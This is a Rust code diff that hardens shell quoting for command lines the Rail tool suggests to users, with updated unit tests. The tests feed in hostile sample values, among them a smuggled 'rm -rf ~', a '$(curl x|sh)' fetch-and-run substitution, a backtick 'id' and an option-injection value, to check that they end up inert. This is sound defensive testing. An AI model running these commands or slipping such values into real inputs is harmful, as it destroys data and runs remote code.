@@ -104,10 +104,10 @@ impl AgentSecretsConfigure {
     fn command(&self) -> String {
         let mut line = format!("rail secrets set {}", self.backend.as_str());
         if let Some(vault) = &self.vault {
-            line.push_str(&format!(" --vault {}", as_typed(vault)));
+            line.push_str(&format!(" --vault {}", as_typed(vault, "<vault>")));
         }
         if let Some(account) = &self.op_account {
-            line.push_str(&format!(" --account {}", as_typed(account)));
+            line.push_str(&format!(" --account {}", as_typed(account, "<account>")));
         }
         if !self.migrate {
             line.push_str(" --no-migrate");
@@ -181,16 +181,24 @@ fn confirmed<T: serde::Serialize>(
     }
 }
 
-/// `who` as the user would type it in a shell: as is when it is a plain name or address.
-fn as_typed(who: &str) -> String {
-    let plain = !who.is_empty()
+/// `who` as the user would type it in a POSIX shell, for a command line Rail suggests: as is when
+/// it is a plain name or address, otherwise in single quotes, where the shell expands nothing
+/// (`$(..)`, backticks and `$VAR` stay literal; a `'` becomes `'\''`). A leading `-` is quoted so
+/// it cannot read as an option. A value with a control or non-ASCII character is not spelled out
+/// at all (`placeholder` is shown instead), so a suggested command can neither hide text nor
+/// forge a line.
+fn as_typed(who: &str, placeholder: &str) -> String {
+    if who.is_empty() || who.chars().any(|c| c.is_control() || !c.is_ascii()) {
+        return placeholder.to_string();
+    }
+    let plain = !who.starts_with('-')
         && who
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || "@._+-".contains(c));
     if plain {
         who.to_string()
     } else {
-        format!("{who:?}")
+        format!("'{}'", who.replace('\'', r"'\''"))
     }
 }
 
@@ -213,7 +221,7 @@ pub async fn remove(
     };
     let yourself = format!(
         "ask the user to run `rail account remove {}` themselves in a terminal.",
-        as_typed(&call.account)
+        as_typed(&call.account, "<name>")
     );
     let answer = confirm_with_user(peer, shown.text).await;
     if let Some(refused) = unconfirmed(answer, "removed", NOT_REMOVED, &yourself) {
@@ -311,15 +319,25 @@ mod tests {
         odd.migrate = false;
         assert_eq!(
             odd.command(),
-            "rail secrets set 1password --vault \"My Vault\" --account me@x.com --no-migrate"
+            "rail secrets set 1password --vault 'My Vault' --account me@x.com --no-migrate"
         );
         assert!(text.contains("do not edit config.toml yourself"), "{text}");
     }
 
     #[test]
     fn a_name_is_shown_as_the_user_would_type_it() {
-        assert_eq!(as_typed("work"), "work");
-        assert_eq!(as_typed("me@example.com"), "me@example.com");
-        assert_eq!(as_typed("a b; rm -rf ~"), "\"a b; rm -rf ~\"");
+        assert_eq!(as_typed("work", "<name>"), "work");
+        assert_eq!(as_typed("me@example.com", "<name>"), "me@example.com");
+        assert_eq!(as_typed("a b; rm -rf ~", "<name>"), "'a b; rm -rf ~'");
+        // Double quotes would still let the shell run these; single quotes keep them literal.
+        assert_eq!(as_typed("$(curl x|sh)", "<v>"), "'$(curl x|sh)'");
+        assert_eq!(as_typed("`id`", "<v>"), "'`id`'");
+        assert_eq!(as_typed("it's", "<v>"), r"'it'\''s'");
+        // A leading dash cannot read as an option.
+        assert_eq!(as_typed("--no-migrate", "<v>"), "'--no-migrate'");
+        // Control and non-ASCII characters are never spelled out.
+        assert_eq!(as_typed("a\nb", "<v>"), "<v>");
+        assert_eq!(as_typed("R\u{430}il", "<v>"), "<v>");
+        assert_eq!(as_typed("", "<v>"), "<v>");
     }
 }
